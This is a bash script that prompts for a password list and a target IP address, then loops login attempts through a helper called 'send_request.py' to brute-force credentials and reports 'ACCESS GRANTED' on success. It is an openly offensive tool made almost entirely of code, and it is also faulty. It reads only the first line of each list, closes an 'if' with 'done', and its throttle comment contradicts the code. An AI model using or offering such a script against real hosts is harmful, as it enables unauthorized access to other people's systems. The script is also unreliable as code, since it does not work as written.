#!/bin/bash

# Prompt the user for the password file name.
printf "Enter the filename of the password list (default: passlist.txt): "
read -r password_list
PASSWORD_LIST="${password_list:-passlist.txt}" # Use default if no name is provided.

# Prompt the user for the IP address to brute force.
printf "Enter the IP address to brute force: "
read -r IP_ADDRESS

# Check and possibly adjust the password list filepath to use a more local search pattern.
PWD_DIR=$(dirname "$0") # Get the directory of the current script. Adjust if you're not running from a fixed location.
# This assumes the password list files are located in the same directory as the script.
# For searching local systems, it might be more practical to provide a full path if needed.

# Display options and let the user choose a password list.
options=("${PWD_DIR}/$PASSWORD_LIST")
i=0
while [ $i -lt ${#options[@]} ]; do
  echo "$i: ${options[$i]}"
  ((i++))
done

# Get user selection
read -p "Select file (enter number): " SELECTION

# If no valid selection, set to the default
! [[ $SELECTION =~ ^[0-9]+$ ]] || PASSWORD_LIST="${options[$SELECTION]}"

echo "Targeting $IP_ADDRESS with password list: $PASSWORD_LIST"

counter=0
# Assuming 'send_request.py' is the script to send login attempts.
while true; do
  username=$(head -n 1 ./usernames.txt) # Get one username at a time.
  # Read one line from the password list and apply the brute-force attempt.
  python3 send_request.py --host "$IP_ADDRESS" --username "$username" --password "$(head -n 1 "$PASSWORD_LIST" | tail -n 1)" && {
    echo "ACCESS GRANTED as $username@$IP_ADDRESS";
    exit 0;
  } || {
    echo "Try again for $username.";
    ((counter++)); # Increment the try counter.
  }
  
  # Throttle the attempts to 500 per minute.
  if ((counter % 1000 == 0)); then
    sleep 0.002
  done

  # Clean-up between attempts, cycling through username files if necessary.
  done

echo "All attempts completed."
